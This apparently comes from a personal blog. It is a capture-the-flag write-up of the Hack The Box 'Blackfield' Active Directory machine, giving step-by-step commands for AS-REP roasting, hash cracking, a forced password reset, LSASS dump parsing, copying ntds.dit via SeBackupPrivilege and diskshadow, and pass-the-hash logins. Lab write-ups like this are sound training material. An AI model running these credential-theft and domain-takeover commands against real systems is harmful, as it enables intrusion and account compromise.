---
layout: post
title: "Blackfield HTB writeup"
subtitle: "Walkethrough for the Blackfield HTB machine."
date: 2025-01-23 23:45:12
background: '/img/posts/04.jpg'

---

# Report

We begin with the usual `nmap` scan. 

```bash
 nmap $ip -sV -sC
```

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123082357.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see a typical `Active Directory` setup.    
We begin by enumerating the `SMB` shares.    

```bash
smbclient -L ////10.10.10.192
```

We can see some uncommon `shares`.   

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123082523.png" alt="1" style="width:700px; height:auto;">
<br/>

We try to see what read access we have using `smbmap`.      

```bash
smbmap -H 10.10.10.192 -u "guest" -p ""
```

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123082616.png" alt="1" style="width:700px; height:auto;">
<br/>

We access `profiles$`.  

```bash
smbclient  //10.10.10.192/profiles$
```

We have multiple folders with potential `usernames`.   

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123082728.png" alt="1" style="width:700px; height:auto;">
<br/>

We can save them into a file and begin looking for valid `usernames` using a tool called `kerbrute`.    

```bash
kerbrute userenum -d BLACKFIELD.local  --dc BLACKFIELD.local users_clean
```

Found valid `usernames`.  

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123083937.png" alt="1" style="width:700px; height:auto;">
<br/>

We look for `users` who can be `asReproastable` using `GetNPUsers` from `impacket`.    

```
 impacket-GetNPUsers BLACKFIELD.local/ -usersfile testUsers -dc-host BLACKFIELD.local
```

We get a hit, user' `hash` can be cracked offline.    

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123084301.png" alt="1" style="width:700px; height:auto;">
<br/>

We save the `hash` into a file and run `hashcat`.    

```bash
hashcat CrackMapExec/hash /usr/share/wordlists/rockyou.txt
```

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123084419.png" alt="1" style="width:700px; height:auto;">
<br/>

Valid credentials `support:#00^BlackKnight`

We can check our `new privileges` and run `bloodhound`  to have a better look at the `A/D` setup.    

```bash
bloodhound-python -python -u 'support' -p '#00^BlackKnight' -dc BLACKFIELD.local -d BLACKFIELD.local -ns 10.10.10.192 --zip -c ALL
```

We Gather the information.   

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123090434.png" alt="1" style="width:700px; height:auto;">
<br/>

We can upload it to `bloodhound` and begin enumeration.   

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123090601.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see that `support` user has the `ForceChangePassword` Permission on `audit2020`.    

We can abuse it by running `bloodyAd`.   

```bash
 python3 bloodyAD.py -d BLACKFIELD.local --host BLACKFIELD.local --dc-ip 10.10.10.192 -u support -p "#00^BlackKnight" set password audit2020 Xtromera@123
```

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123101537.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see the successful change of the `password`.    

We can double check using `smbmap`.  

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123101720.png" alt="1" style="width:700px; height:auto;">
<br/>

We have a new access to `forensic` folder.   

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123101816.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see some `forensic` files. Checking the `memory_analysis`.  

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123101844.png" alt="1" style="width:700px; height:auto;">
<br/>

We get `lsaas.zip` which represents a `DUMP` file of the `lsaas` process in `windows`.  We can download it, extract it, and run  `pypykatz` to read the `dump` file.    
```bash
pypykatz lsa minidump lsass.DMP
```

We get some new credentials.   

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123102153.png" alt="1" style="width:700px; height:auto;">
<br/>

The `NT` hash of `svc_backup`, we can use it to connect to the machine using `evil-winrm`.    

```bash
 evil-winrm -i 10.10.10.192 -u svc_backup -H  9658d1d1dcd9250115e2205d9f48400d
```

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123102316.png" alt="1" style="width:700px; height:auto;">
<br/>

We can check the privilege this `user` has.   

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123102336.png" alt="1" style="width:700px; height:auto;">
<br/>

It can `backup` and `read` any files in the system. To abuse this privilege, we can `dump` the `ntds` file on the system.   

We can get help from this [blog](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/), abusing the `diskshadow` property preinstalled on Windows to get a copy of the `C` drive in use, to be able to copy the `NTDS` file, as this latter is always in use whenever the `system` is up and running.     

We can create a `DSH` (disturbed shell file) where we will put the command to be used by the `diskshadow` utility.    

```dsh
set context persistent nowriters

add volume c: alias raj

create

expose %raj% z:
```

Perform the `unix2dos` conversion.   

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123105314.png" alt="1" style="width:700px; height:auto;">
<br/>

upload the file and run it.    

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123105348.png" alt="1" style="width:700px; height:auto;">
<br/>

use `robocopy` to copy the targeted file.     

```powershell
robocopy /b z:\windows\ntds . ntds.dit
```

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123105428.png" alt="1" style="width:700px; height:auto;">
<br/>

Copy the system file too, to be able to `decrypt` the `NTDS` file.     

```powershell
 reg save hklm\system c:\temp\system
```

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123105518.png" alt="1" style="width:700px; height:auto;">
<br/>

Now use `secretsdump` to perform the attack and extract the `hash`.    

```bash
impacket-secretsdump LOCAL -system system -ntds ntds.dit
```

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123105635.png" alt="1" style="width:700px; height:auto;">
<br/>

perform `evil-winrm`.  

```bash
 evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123105833.png" alt="1" style="width:700px; height:auto;">
<br/>

The machine was `pawned` successfully. 
<br/> 
<img src="/img/Blackfield_Screenshots/Pasted image 20250123110101.png" alt="1" style="width:700px; height:auto;">
<br/>


